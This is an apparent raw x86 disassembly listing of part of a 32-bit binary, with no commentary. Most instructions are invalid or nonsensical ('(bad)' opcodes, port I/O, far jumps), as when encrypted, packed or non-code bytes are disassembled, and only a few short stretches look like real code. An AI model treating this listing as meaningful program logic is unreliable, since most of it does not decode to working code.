  40899f:	(bad)  [edi+0x76]
  4089a2:	lock sub al,BYTE PTR [edx-0x24]
  4089a6:	and    DWORD PTR [ecx-0x6a203620],ecx
  4089ac:	fidiv  WORD PTR [edx+0x2debef6d]
  4089b2:	cmp    BYTE PTR [edx+0x2afd1787],dh
  4089b8:	dec    ecx
  4089b9:	rcl    DWORD PTR [esi],0xa2
  4089bc:	push   es
  4089bd:	shl    BYTE PTR [ebx+0x50],0xaf
  4089c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c2:	jbe    0x408a26
  4089c4:	mov    ecx,0xaa998130
  4089c9:	cld    
  4089ca:	mov    ebp,DWORD PTR [ebx+0x4282e008]
  4089d0:	scas   eax,DWORD PTR es:[edi]
  4089d1:	es jmp 0x3306:0x1b640507
  4089d9:	orps   xmm3,XMMWORD PTR [ecx]
  4089dc:	or     ch,BYTE PTR [ebx+ecx*1]
  4089df:	xor    bh,BYTE PTR [ebx]
  4089e1:	shr    DWORD PTR [ebx+0x3a66005e],0x9d
  4089e8:	push   esi
  4089e9:	pop    ds
  4089ea:	xchg   edi,eax
  4089eb:	mov    al,0xd6
  4089ed:	daa    
  4089ee:	xor    eax,0x7adc9274
  4089f3:	test   al,0x9c
  4089f5:	and    BYTE PTR [edx+ebx*1-0x535b0281],al
  4089fc:	clc    
  4089fd:	add    BYTE PTR [edi-0x4b],bl
  408a00:	(bad)
  408a03:	add    eax,0x6fccd3e8
  408a08:	and    ch,BYTE PTR [eax+0x2f]
  408a0b:	mov    ds:0x2fb3cf5a,eax
  408a10:	inc    ebx
  408a11:	adc    eax,0x482936ec
  408a16:	div    DWORD PTR [ecx]
  408a18:	mov    esi,0x8057f45b
  408a1d:	inc    ebp
  408a1e:	sub    edx,ebp
  408a20:	pop    edx
  408a21:	mov    eax,0x88a77cdd
  408a26:	pushf  
  408a27:	pop    ecx
  408a28:	int3   
  408a29:	ror    ebx,0x9
  408a2c:	out    dx,al
  408a2d:	ror    DWORD PTR [ebp-0xa],0x5
  408a31:	jmp    0x408a33
  408a33:	adc    DWORD PTR [ecx],edi
  408a35:	mov    ecx,DWORD PTR [ebp-0x7c70b81]
  408a3b:	inc    esi
  408a3c:	retf   
  408a3d:	mov    ch,0x6
  408a3f:	or     cl,BYTE PTR [edi-0x37131c04]
  408a45:	repnz pop ds
  408a47:	ret    0x5e5
  408a4a:	in     al,dx
  408a4b:	into   
  408a4c:	(bad)  
  408a4d:	jmp    FWORD PTR [ebp-0x28]
  408a50:	shl    BYTE PTR [ebx-0x6e],1
  408a53:	jl     0x4089d5
  408a55:	and    al,dl
  408a57:	mov    gs,WORD PTR [ebx-0x216ed06]
  408a5d:	inc    ecx
  408a5e:	adc    BYTE PTR [ecx],al
  408a60:	(bad)  
  408a61:	xchg   edi,eax
  408a62:	sar    edi,1
  408a64:	leave  
  408a65:	push   ebx
  408a66:	adc    ecx,DWORD PTR [ebp+0x1858fbfb]
  408a6c:	mov    WORD PTR [ebp+0x33062de1],gs
  408a72:	jo     0x408a1c
  408a74:	pop    ds
  408a75:	call   0x8db5edc4
  408a7a:	stos   BYTE PTR es:[edi],al
  408a7b:	(bad)  
  408a7c:	out    0xb8,eax
  408a7e:	sahf   
  408a7f:	jp     0x408ab0
  408a81:	jl     0x408aab
  408a83:	xor    ebp,edi
  408a85:	mov    ds:0x46c97833,al
  408a8a:	dec    edi
  408a8b:	and    dh,BYTE PTR [esi-0x3eba3a5f]
  408a91:	outs   dx,BYTE PTR ds:[esi]
  408a92:	xchg   ebx,eax
  408a93:	and    al,dh
  408a95:	pop    edx
  408a96:	shr    BYTE PTR [ecx],cl
  408a98:	inc    eax
  408a99:	dec    edi
  408a9a:	(bad)  
  408a9b:	pusha  
  408a9c:	adc    BYTE PTR [ebx+0x10],dl
  408a9f:	shl    BYTE PTR ds:0xf2ec22a3,1
  408aa5:	push   edx
  408aa6:	pop    edx
  408aa7:	push   es
  408aa8:	mov    BYTE PTR [ecx-0x30ad2600],bl
  408aae:	call   0xd2c630ed
  408ab3:	sub    DWORD PTR [edi-0x549e92fa],ecx
  408ab9:	mov    edx,0x6d3f9fa4
  408abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408abf:	retf   0x3297
  408ac2:	and    ebp,DWORD PTR [edx-0x1a9bf27]
  408ac8:	xor    al,0xe1
  408aca:	and    BYTE PTR [ebp+0x67fce1d2],0xe7
  408ad1:	and    DWORD PTR ds:0xbfd5f474,edx
  408ad7:	sbb    eax,0x11067c8c
  408adc:	dec    eax
  408add:	int3   
  408ade:	mov    eax,ds:0x64a1d90e
  408ae3:	and    dh,BYTE PTR [ebx]
  408ae5:	xor    eax,0x248b94d2
  408aea:	popf   
  408aeb:	jp     0x408b40
  408aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aee:	push   0x2a
  408af0:	sub    eax,0x78931260
  408af5:	sub    bh,cl
  408af7:	mov    esi,0xc4e1059b
  408afc:	xchg   ecx,eax
  408afd:	jecxz  0x408aef
  408aff:	or     eax,0x597691c
  408b04:	jno    0x408ac3
  408b06:	stos   BYTE PTR es:[edi],al
  408b07:	push   0x4a459344
  408b0c:	or     ah,BYTE PTR [edi+0x62fcf7f9]
  408b12:	pop    es
  408b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b14:	lds    esi,FWORD PTR [edi-0x52]
  408b17:	inc    eax
  408b18:	jl     0x408aa5
  408b1a:	dec    esi
  408b1b:	or     ch,BYTE PTR [eax-0x2fec217d]
  408b21:	mov    bl,BYTE PTR [esi-0x4765d8ff]
  408b27:	dec    ecx
  408b28:	bound  ecx,QWORD PTR [edi]
  408b2a:	jne    0x408ac1
  408b2c:	pop    esi
  408b2d:	loop   0x408b95
  408b2f:	pop    esi
  408b30:	push   0x4030a5a9
  408b35:	adc    al,0xfb
  408b37:	mov    edx,0x29997b59
  408b3c:	jmp    0x699c8ca2
  408b41:	jo     0x408b38
  408b43:	pop    ds
  408b44:	shl    BYTE PTR [edi-0x16],1
  408b47:	mov    DWORD PTR [eax-0x2f],edx
  408b4a:	imul   BYTE PTR [edi+0x6f]
  408b4d:	pop    ecx
  408b4e:	jmp    0x408bcc
  408b50:	jmp    0x67c:0x4ad50469
  408b57:	scas   eax,DWORD PTR es:[edi]
  408b58:	and    al,0x7a
  408b5a:	bnd cs ja 0x408b9b
  408b5e:	fpatan 
  408b60:	retf   0x7361
  408b63:	push   eax
  408b64:	xchg   edi,eax
  408b65:	test   DWORD PTR [eax],ebx
  408b67:	imul   edi,DWORD PTR [edx+0x59de3159],0xfdbb682a
  408b71:	loope  0x408b0e
  408b73:	pop    esp
  408b74:	pusha  
  408b75:	push   eax
  408b76:	test   DWORD PTR [eax],esp
  408b78:	pop    ecx
  408b79:	and    ch,dl
  408b7b:	mov    esp,0x27226eda
  408b80:	dec    edx
  408b81:	(bad)  
  408b82:	repz sbb eax,0x97df94a2
  408b88:	div    DWORD PTR [edx]
  408b8a:	pop    ss
  408b8b:	jmp    0x408bf7
  408b8d:	std    
  408b8e:	or     DWORD PTR [ebp-0x1c9bd57c],ebx
  408b94:	or     ebx,esp
  408b96:	cwde   
  408b97:	mov    cl,0x55
  408b99:	pop    eax
  408b9a:	push   edx
  408b9b:	or     BYTE PTR [edi-0x4],0x8b
  408b9f:	ins    BYTE PTR es:[edi],dx
  408ba0:	jl     0x408b6b
  408ba2:	and    BYTE PTR [esi+ebx*4-0x7b],dl
  408ba6:	fiadd  WORD PTR [ebp+0x43]
  408ba9:	cmp    al,0xa3
  408bab:	sub    bh,dl
  408bad:	into   
  408bae:	aad    0x43
  408bb0:	mov    BYTE PTR [ebx+0x6],bl
  408bb3:	xchg   ebp,eax
  408bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bb5:	retf   
  408bb6:	adc    eax,0x572b7b98
  408bbb:	push   ebx
  408bbc:	nop
  408bbd:	mov    ss,eax
  408bbf:	pop    eax
  408bc0:	cdq    
  408bc1:	(bad)  
  408bc2:	outs   dx,BYTE PTR ds:[esi]
  408bc3:	hlt    
  408bc4:	push   edi
  408bc5:	aaa    
  408bc6:	cmp    eax,0xaf1cd90d
  408bcb:	lods   al,BYTE PTR gs:[esi]
  408bcd:	add    al,0x58
  408bcf:	xor    ch,dh
  408bd1:	rol    BYTE PTR [esi],1
  408bd3:	sub    dl,BYTE PTR [ebx+0x286475a8]
  408bd9:	dec    esp
  408bda:	push   ds
  408bdb:	pushf  
  408bdc:	out    dx,al
  408bdd:	pop    ecx
  408bde:	(bad)  
  408bdf:	loopne 0x408c37
  408be1:	cdq    
  408be2:	retf   0x6fe1
  408be5:	pop    ebp
  408be6:	enter  0xeea8,0x8a
  408bea:	pop    es
  408beb:	fs sub bh,ah
  408bee:	lods   eax,DWORD PTR ds:[esi]
  408bef:	mov    bh,0x8c
  408bf1:	dec    eax
  408bf2:	inc    ebp
  408bf3:	scas   eax,DWORD PTR es:[edi]
  408bf4:	adc    eax,0x86ed0cbf
  408bf9:	cld    
  408bfa:	pop    eax
  408bfb:	and    eax,0x6ea48e14
  408c00:	adc    BYTE PTR [ecx+0x74],0x83
  408c04:	mov    dh,0x24
  408c06:	mov    esi,0xb785caee
  408c0b:	pop    ebx
  408c0c:	mov    ds:0x280a0bed,al
  408c11:	add    eax,DWORD PTR [esi-0x9bac678]
  408c17:	dec    ecx
  408c18:	cwde   
  408c19:	inc    esp
  408c1a:	pop    ss
  408c1b:	or     bh,bh
  408c1d:	aaa    
  408c1e:	aam    0xdd
  408c20:	ins    BYTE PTR es:[edi],dx
  408c21:	fcom   DWORD PTR [eax]
  408c23:	jl     0x408bba
  408c25:	call   0x6b1195d8
  408c2a:	lahf   
  408c2b:	mov    esi,ebx
  408c2d:	sahf   
  408c2e:	jo     0x408bd8
  408c30:	hlt    
  408c31:	or     al,0xbd
  408c33:	or     DWORD PTR [ebx+0x5bd03c23],esi
  408c39:	push   es
  408c3a:	test   al,0xc9
  408c3c:	and    eax,0xc219e903
  408c41:	sub    BYTE PTR ds:0x7f199a1,bl
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  edx,QWORD PTR [edi+0x4b]
  408c72:	ins    BYTE PTR es:[edi],dx
  408c73:	mov    eax,DWORD PTR [edi-0x27]
  408c76:	jo     0x408ce8
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408cc0
  408c7d:	lods   al,BYTE PTR ds:[esi]
  408c7e:	imul   edx,DWORD PTR [edx],0xffffff96
  408c81:	jg     0x408c55
  408c83:	jns    0x408ccd
  408c85:	inc    ebx
  408c86:	cs jbe 0x408cc4
  408c89:	push   ebp
  408c8a:	rcr    DWORD PTR [eax],1
  408c8c:	adc    ecx,DWORD PTR [ebx+0x7c]
  408c8f:	xchg   esi,eax
  408c90:	jb     0x408c2b
  408c92:	cmp    edx,esi
  408c94:	addr16 fwait
  408c96:	repnz add DWORD PTR ds:0x30f1707f,0x6e
  408c9e:	imul   ebx,eax,0xc99ac04c
  408ca4:	call   0x8dd0456a
  408ca9:	push   ss
  408caa:	dec    esi
  408cab:	sti    
  408cac:	xchg   esi,eax
  408cad:	jge    0x408ccc
  408caf:	stos   BYTE PTR es:[edi],al
  408cb0:	mov    ch,0xe3
  408cb2:	shr    bh,1
  408cb4:	and    cl,bl
  408cb6:	inc    edx
  408cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cb8:	repnz lahf 
  408cba:	dec    edi
  408cbb:	repnz adc DWORD PTR [eax-0x6a],0x65523f1c
  408cc3:	fldenv [ebp+0x8]
  408cc6:	popa   
  408cc7:	es jb  0x408ccc
  408cca:	pop    esp
  408ccb:	push   ds
  408ccc:	in     eax,0x9b
  408cce:	in     eax,dx
  408ccf:	jmp    0x20dcf632
  408cd4:	call   0xf996:0x1a05fa20
  408cdb:	das    
  408cdc:	in     eax,dx
  408cdd:	dec    ebp
  408cde:	(bad)  
  408cdf:	lahf   
  408ce0:	xchg   BYTE PTR [edx],ch
  408ce2:	add    BYTE PTR ds:0xab4ca46c,0x4f
  408ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cea:	test   eax,0xb2fbaa2e
  408cef:	gs pop ss
  408cf1:	jmp    DWORD PTR cs:[eax+0x38be37a6]
  408cf8:	shr    DWORD PTR [esi+0x272a3b26],0xe8
  408cff:	sub    eax,0x32638410
  408d04:	jl     0x408d21
  408d06:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d08:	into   
  408d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d0a:	out    dx,eax
  408d0b:	mov    edx,0xc15696c
  408d10:	scas   al,BYTE PTR es:[edi]
  408d11:	jb     0x408d4b
  408d13:	and    bh,BYTE PTR [esi-0x2b]
  408d16:	push   edi
  408d17:	stc    
  408d18:	dec    esi
  408d19:	jno    0x408d05
  408d1b:	sar    bh,1
  408d1d:	inc    ebx
  408d1e:	jmp    0x5e06:0xb6f14156
  408d25:	push   ecx
  408d26:	scas   al,BYTE PTR es:[edi]
  408d27:	or     BYTE PTR [eax-0x3],dl
  408d2a:	adc    DWORD PTR [ebx],0x7f8cea1e
  408d30:	inc    edi
  408d31:	das    
  408d32:	into   
  408d33:	test   BYTE PTR [ebp-0x27],dl
  408d36:	inc    ebx
  408d37:	xchg   esp,eax
  408d38:	and    BYTE PTR [esi],ch
  408d3a:	rol    ah,0xc9
  408d3d:	and    dl,ah
  408d3f:	das    
  408d40:	cmp    al,dl
  408d42:	adc    BYTE PTR [eax+0x77cd6858],ch
  408d48:	pop    ss
  408d49:	add    BYTE PTR [ebx],ah
  408d4b:	repz mov dl,0xd9
  408d4e:	enter  0x89ae,0x68
  408d52:	pop    ss
  408d53:	ins    BYTE PTR es:[edi],dx
  408d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d55:	or     al,0xa9
  408d57:	enter  0x8ec4,0x9f
  408d5b:	in     al,dx
  408d5c:	jle    0x408cf8
  408d5e:	adc    eax,0xae1fcede
  408d63:	xchg   esp,eax
  408d64:	and    bh,BYTE PTR [edx]
  408d66:	jg     0x408d48
  408d68:	lods   al,BYTE PTR ds:[esi]
  408d69:	or     bl,BYTE PTR [ecx-0x74]
  408d6c:	sbb    bl,BYTE PTR [edi+edi*4-0x6a]
  408d70:	mov    edi,0xdce36066
  408d75:	inc    ebx
  408d76:	jle    0x408d38
  408d78:	in     eax,dx
  408d79:	xchg   ebx,eax
  408d7a:	and    ecx,ebx
  408d7c:	inc    ebx
  408d7d:	mov    ch,0xff
  408d7f:	jno    0x408d0f
  408d81:	cmp    ebp,DWORD PTR [esi+0x108a1592]
  408d87:	data16 daa 
  408d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d8a:	std    
  408d8b:	and    DWORD PTR [esi+0x7ea0e901],edx
  408d91:	xchg   BYTE PTR [edi],bl
  408d93:	push   cs
  408d94:	jge    0x408d36
  408d96:	ror    edi,0x41
  408d99:	popf   
  408d9a:	push   ss
  408d9b:	sbb    eax,ebp
  408d9d:	and    BYTE PTR [edx-0x4bd8eb8b],cl
  408da3:	lea    ebx,[ebp-0x401fefa3]
  408da9:	hlt    
  408daa:	push   0x2bcdf94b
  408daf:	sub    DWORD PTR es:[ecx-0x145a9e0f],ebx
  408db6:	xchg   DWORD PTR [edi],edi
  408db8:	mov    ch,0x2b
  408dba:	xor    BYTE PTR [edi-0x35c015f8],dh
  408dc0:	std    
  408dc1:	pop    esi
  408dc2:	mov    esp,0xd86e4b2a
  408dc7:	hlt    
  408dc8:	int    0x19
  408dca:	sti    
  408dcb:	push   0xfffffffa
  408dcd:	sbb    edi,DWORD PTR [ecx-0x6a]
  408dd0:	push   0xfffffffe
  408dd2:	test   DWORD PTR [eax-0x29a4c4e0],esi
  408dd8:	adc    al,0x8e
  408dda:	or     cl,BYTE PTR [esi+0x22]
  408ddd:	or     bl,ch
  408ddf:	adc    eax,DWORD PTR [eax+0x3bb8a2c9]
  408de5:	dec    edi
  408de6:	fs retf 
  408de8:	rol    BYTE PTR [esi+edx*4+0x715f2e2d],0x78
  408df0:	(bad)  
  408df1:	push   ebx
  408df2:	mov    eax,0x3c7e2c12
  408df7:	sub    ecx,esp
  408df9:	in     eax,dx
  408dfa:	js     0x408e5c
  408dfc:	or     BYTE PTR [eax+0x6eb3bfb3],0xf7
  408e03:	aas    
  408e04:	add    al,0x28
  408e06:	out    dx,eax
  408e07:	push   edi
  408e08:	adc    al,0xf5
  408e0a:	jecxz  0x408dff
  408e0c:	xlat   BYTE PTR ds:[ebx]
  408e0d:	inc    ebx
  408e0e:	das    
  408e0f:	push   ecx
  408e10:	mov    ds:0xb8659427,eax
  408e15:	jl     0x408db7
  408e17:	aam    0x86
  408e19:	add    DWORD PTR [edi+ebp*4-0x16],edx
  408e1d:	cwde   
  408e1e:	aas    
  408e1f:	gs jnp 0x408e66
  408e22:	push   esp
  408e23:	iret   
  408e24:	mov    al,0xcb
  408e26:	jg     0x408dfa
  408e28:	stc    
  408e29:	adc    al,0x83
  408e2b:	scas   eax,DWORD PTR es:[edi]
  408e2c:	in     eax,0x2e
  408e2e:	fidivr DWORD PTR [ebx+0x26]
  408e31:	cmc    
  408e32:	inc    ecx
  408e33:	fwait
  408e34:	or     ebp,edx
  408e36:	pop    ebx
  408e37:	scas   al,BYTE PTR es:[edi]
  408e38:	pop    ds
  408e39:	int3   
  408e3a:	out    dx,al
  408e3b:	out    0xb1,al
  408e3d:	loopne 0x408e46
  408e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e40:	daa    
  408e41:	push   edx
  408e42:	imul   ebx,DWORD PTR [ebp+0x24762758],0xad65364c
  408e4c:	scas   eax,DWORD PTR es:[edi]
  408e4d:	mov    ch,0x57
  408e4f:	call   0x7fe0:0x8b7e5b2d
  408e56:	or     DWORD PTR [ebp+0x3e],ebp
  408e59:	repnz mov es,WORD PTR [edx]
  408e5c:	mov    BYTE PTR [ebx+0x3e27f4db],ch
  408e62:	jne    0x408e28
  408e64:	cdq    
  408e65:	xchg   ebp,eax
  408e66:	sbb    ch,BYTE PTR [ecx-0x79]
  408e69:	(bad)  
  408e6a:	fdivr  QWORD PTR [esi-0x7b8fd86c]
  408e70:	ins    BYTE PTR es:[edi],dx
  408e71:	mov    cl,0xe3
  408e73:	rcr    edx,0xe3
  408e76:	idiv   BYTE PTR [ebx+0x3a462ccf]
  408e7c:	test   eax,0xc4e58719
  408e81:	adc    cl,BYTE PTR [esi]
  408e83:	push   0x8651b754
  408e88:	loopne 0x408edc
  408e8a:	xor    DWORD PTR [edx*4-0x1ac2fd96],edx
  408e91:	adc    BYTE PTR [ecx+ebx*2],0x97
  408e95:	fsub   DWORD PTR [esp+eax*4+0x4e]
  408e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9a:	ds xor ebp,eax
  408e9d:	dec    esp
  408e9e:	pop    edx
  408e9f:	bnd jnp 0x408e54
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	pushf  
  408ea4:	bound  ecx,QWORD PTR [ebp+0x487439ba]
  408eaa:	aad    0x1b
  408eac:	fnstcw WORD PTR [esi-0x5]
  408eaf:	cmp    ebp,eax
  408eb1:	jp     0x408ef3
  408eb3:	add    al,0x7d
  408eb5:	xchg   ecx,eax
  408eb6:	sub    BYTE PTR es:[esp+edi*2+0x287b0128],0x78
  408ebf:	jb     0x408e9f
  408ec1:	ror    DWORD PTR [eax-0xd],0x7c
  408ec5:	fcomp  DWORD PTR [eax+ebp*2-0x6fb3650f]
  408ecc:	je     0x408eaa
  408ece:	sbb    al,0x5f
  408ed0:	out    dx,al
  408ed1:	in     al,dx
  408ed2:	jmp    0x408e96
  408ed4:	adc    bh,BYTE PTR [ebx]
  408ed6:	mov    ch,0xf0
  408ed8:	pop    esi
  408ed9:	fld    TBYTE PTR [ebx+eax*8+0x3eeb6c00]
  408ee0:	mov    ah,0x40
  408ee2:	pop    esi
  408ee3:	push   0xffffffb9
  408ee5:	jns    0x408e9f
  408ee7:	mov    edx,0xbdb93d12
  408eec:	dec    eax
  408eed:	ret    
  408eee:	pop    eax
  408eef:	mov    eax,0xad2861a
  408ef4:	int3   
  408ef5:	push   ebx
  408ef6:	and    cl,BYTE PTR [edi]
  408ef8:	pop    edx
  408ef9:	jmp    0xbc3d9b01
  408efe:	and    eax,0x23c47ad3
  408f03:	push   edx
  408f04:	ins    BYTE PTR es:[edi],dx
  408f05:	mov    cl,0x6e
  408f07:	cmp    eax,0x8f374f25
  408f0c:	in     eax,dx
  408f0d:	jmp    0xf3d5f6f8
  408f12:	dec    eax
  408f13:	popa   
  408f14:	push   ecx
  408f15:	or     al,0x0
  408f17:	imul   edx,DWORD PTR [ebx+0x78aef522],0x9d4c59aa
  408f21:	fwait
  408f22:	je     0x408f0e
  408f24:	or     esp,edx
  408f26:	pop    esp
  408f27:	xor    edi,edi
  408f29:	les    edx,FWORD PTR [eax-0x523cb502]
  408f2f:	sbb    esi,eax
  408f31:	mov    dh,0x64
  408f33:	cmc    
  408f34:	fwait
  408f35:	push   ebx
  408f36:	aaa    
  408f37:	sbb    DWORD PTR [edx],ebp
  408f39:	inc    ecx
  408f3a:	pop    edx
  408f3b:	stos   BYTE PTR es:[edi],al
  408f3c:	and    eax,0xc3851855
  408f41:	sahf   
  408f42:	cwde   
  408f43:	test   BYTE PTR [ecx+0x537a83ea],dl
  408f49:	pop    ebp
  408f4a:	pop    eax
  408f4b:	outs   dx,DWORD PTR ds:[esi]
  408f4c:	push   eax
  408f4d:	dec    esp
  408f4e:	fcmovbe st,st(3)
  408f50:	push   0xffffffd2
  408f52:	jno    0x408f8b
  408f54:	stc    
  408f55:	and    edi,DWORD PTR [ecx]
  408f57:	inc    eax
  408f58:	push   ecx
  408f59:	or     al,0x11
  408f5b:	or     BYTE PTR [edx-0x6a],al
  408f5e:	xlat   BYTE PTR ds:[ebx]
  408f5f:	mov    bl,ah
  408f61:	mov    ebp,0xbbea4bcc
  408f66:	dec    edi
  408f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f68:	aam    0xbb
  408f6a:	loopne 0x408fc3
  408f6c:	(bad)  
  408f6d:	rol    BYTE PTR [ecx+esi*2+0x79],0x38
  408f72:	mov    edx,0xb73d5f37
  408f77:	or     al,0x65
  408f79:	sbb    eax,0xd064dde7
  408f7e:	sub    dl,ah
  408f80:	jno    0x408f86
  408f82:	lea    esp,[edx+0x20365284]
  408f88:	sbb    cl,BYTE PTR [eax]
  408f8a:	imul   cl
  408f8c:	xor    eax,0x5de3194f
  408f91:	mov    edx,0x981ea8ca
  408f96:	int    0x60
  408f98:	add    bl,BYTE PTR ds:0xc1b549f5
  408f9e:	sbb    DWORD PTR [ebp-0x2f1f9b9c],ecx
  408fa4:	retf   
  408fa5:	ins    BYTE PTR es:[edi],dx
  408fa6:	cwde   
  408fa7:	push   0xd495a819
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xf21937f3
  408fc6:	xchg   edi,eax
  408fc7:	pop    ebx
  408fc8:	push   0x7070e677
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408fcf
  408fd2:	test   BYTE PTR [ebx-0x783a8c0b],dl
  408fd8:	fucomp st(2)
  408fda:	xchg   edi,eax
  408fdb:	xchg   edx,eax
  408fdc:	xchg   edi,eax
  408fde:	jecxz  0x409013
  408fe0:	jl     0x408fb9
  408fe2:	std    
  408fe3:	adc    DWORD PTR [ecx+edx*2],esi
  408fe6:	idiv   DWORD PTR [edi]
  408fe8:	dec    edx
  408fe9:	push   ebx
  408fea:	mov    edx,0x97cdac30
  408fef:	aad    0x2f
  408ff1:	cdq    
  408ff2:	sub    al,BYTE PTR [edi+0x32d09be]
  408ff8:	(bad)  
  408ff9:	sub    esp,esi
  408ffb:	test   eax,0x5950e13
  409000:	xor    eax,DWORD PTR [ebp-0x60975069]
  409006:	rcr    BYTE PTR [ebp+0x55],1
  409009:	pop    ss
  40900a:	cmp    si,di
  40900d:	mov    cl,0xb2
  40900f:	popf   
  409010:	adc    DWORD PTR [ecx+0x15],eax
  409013:	loope  0x409030
  409015:	xchg   esi,eax
  409016:	es clc 
  409018:	inc    edi
  409019:	mov    al,ds:0xe8e8df16
  40901e:	aas    
  40901f:	xchg   edi,eax
  409020:	cmp    eax,0x2021e22d
  409025:	mov    esi,0x9caa0684
  40902a:	scas   al,BYTE PTR es:[edi]
  40902b:	xor    al,0xd2
  40902d:	stos   DWORD PTR es:[edi],eax
  40902e:	mov    cl,0xd0
  409030:	inc    ecx
  409031:	mov    WORD PTR [ebp-0x227da4c],?
  409037:	lock add eax,0x9896656e
  40903d:	ins    DWORD PTR es:[edi],dx
  40903e:	sub    eax,0xed237df7
  409043:	push   eax
  409044:	mov    bh,0xfd
  409046:	pmaxub mm7,QWORD PTR [edi-0x53809133]
  40904d:	dec    esi
  40904e:	ret    0x2a32
  409051:	in     al,dx
  409052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409053:	mov    dl,0x1c
  409055:	jl     0x4090a6
  409057:	add    eax,0xf58a41b9
  40905c:	scas   al,BYTE PTR es:[edi]
  40905d:	cmp    DWORD PTR [edx],esi
  40905f:	jmp    0x4ce9:0xa1457f47
  409066:	sbb    al,0xfb
  409068:	push   edx
  409069:	jle    0x4090c5
  40906b:	sub    al,0xdd
  40906d:	mov    al,0x4f
  40906f:	call   0x4efe:0x58f00b21
  409076:	rcl    BYTE PTR [edi-0x72b6730d],1
  40907c:	dec    esi
  40907d:	lahf   
  40907e:	ins    DWORD PTR es:[edi],dx
  40907f:	out    dx,eax
  409080:	sub    bl,dh
  409082:	ror    DWORD PTR ds:0x14be9e39,cl
  409088:	mov    bh,0x7f
  40908a:	or     eax,0x6b8fbf08
  40908f:	lods   al,BYTE PTR ds:[esi]
  409090:	mov    WORD PTR [ebx+0x2d],?
  409093:	aaa    
  409094:	fs adc eax,0xbfc75ea7
  40909a:	out    0x9f,eax
  40909c:	adc    eax,0x63beecad
  4090a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090a2:	jecxz  0x40907e
  4090a4:	lea    ebx,[edi+0x5148f7fc]
  4090aa:	retf   
  4090ab:	sbb    BYTE PTR [eax+0x787fdefe],0xe7
  4090b2:	mov    esp,0xeb2a016c
  4090b7:	push   esp
  4090b8:	dec    ecx
  4090b9:	mov    cl,0xa
  4090bb:	ficom  WORD PTR [edi]
  4090bd:	mov    DWORD PTR [ecx+0x4c20ac49],ecx
  4090c3:	stc    
  4090c4:	dec    esi
  4090c5:	out    0x40,al
  4090c7:	ins    DWORD PTR es:[edi],dx
  4090c8:	stos   DWORD PTR es:[edi],eax
  4090c9:	in     al,dx
  4090ca:	cmp    edx,DWORD PTR [edx+0x5ec4e19f]
  4090d0:	les    edx,FWORD PTR [edx+0x7a4262a5]
  4090d6:	test   DWORD PTR [ebx+0x2e],esp
  4090d9:	mov    ah,0x75
  4090db:	jbe    0x4090c1
  4090dd:	retf   
  4090de:	push   ecx
  4090df:	rol    DWORD PTR [esi],1
  4090e1:	dec    ecx
  4090e2:	adc    al,bh
  4090e4:	test   BYTE PTR [esi],bl
  4090e6:	cmp    eax,0x25eb992
  4090eb:	clc    
  4090ec:	jle    0x40912c
  4090ee:	repz shr DWORD PTR [edx],0xd7
  4090f2:	adc    eax,0x61083a92
  4090f7:	jg     0x409138
  4090f9:	xor    eax,0x81d41dae
  4090fe:	enter  0x526e,0x23
  409102:	sub    al,0x78
  409104:	dec    ecx
  409105:	sti    
  409106:	popa   
  409107:	ror    ebx,cl
  409109:	(bad)  
  40910a:	in     al,dx
  40910b:	or     bl,BYTE PTR ss:[ecx-0x36bca25f]
  409112:	call   0xcf35:0x16c09058
  409119:	lea    edx,[edx+0x656a233]
  40911f:	sbb    eax,0x8ea93982
  409124:	ret    
  409125:	in     al,0xb8
  409127:	daa    
  409128:	sbb    ebx,edx
  40912a:	repz hlt 
  40912c:	add    al,0x19
  40912e:	mov    esi,DWORD PTR [ebx+edx*2+0x0]
  409132:	jno    0x409111
  409134:	sbb    esi,ebx
  409136:	jge    0x409178
  409138:	mov    eax,0xfca97315
  40913d:	xor    eax,0x5c2ff642
  409142:	adc    cl,BYTE PTR [edx-0x8]
  409145:	mov    ebx,0xad4ec4e7
  40914a:	enter  0x75b1,0x59
  40914e:	inc    esi
  40914f:	in     al,0x16
  409151:	mov    DWORD PTR fs:[ebp-0x6863c0b6],ecx
  409158:	rol    BYTE PTR cs:0x84c8878a,1
  40915f:	add    DWORD PTR [eax+0x1e],esp
  409162:	sub    eax,0x3a24d51f
  409167:	adc    BYTE PTR [edi],0x31
  40916a:	mov    bl,0xf1
  40916c:	xchg   BYTE PTR [edi],ah
  40916e:	mov    edi,0xa7a5cdcd
  409173:	addr16 enter 0xb429,0xbb
  409178:	sub    BYTE PTR [eax],al
  40917a:	mov    cs,WORD PTR [eax]
  40917c:	cwde   
  40917d:	and    al,0x90
